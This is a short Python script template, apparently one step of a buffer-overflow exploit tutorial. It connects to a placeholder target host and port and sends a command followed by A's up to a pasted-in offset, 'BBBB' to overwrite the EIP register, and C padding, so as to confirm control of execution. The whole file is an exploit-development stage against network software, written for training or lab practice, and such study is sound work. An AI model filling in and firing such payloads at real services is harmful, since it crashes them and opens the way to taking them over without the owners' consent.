#!/usr/bin/python

import socket, struct

RHOST = '<ip>'
RPORT = <port>
cmd = '<command>'
buf_totlen = <buffer_length>
offset_srp = ## Paste in Offset found in step 2

"""
######################################################

Confirm the offset by overwriting the EIP with Killer B's

    42424242

######################################################
"""

buf = ""
buf += "A" * (offset_srp - len(buf))    # Send the A's up to the EIP
buf += "BBBB"                           # Killer B's attack the EIP
buf += "C" * (buf_totlen - len(buf))    # C ya later
buf += "\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))
s.send(cmd + buf)
s.recv(1024)
s.close()

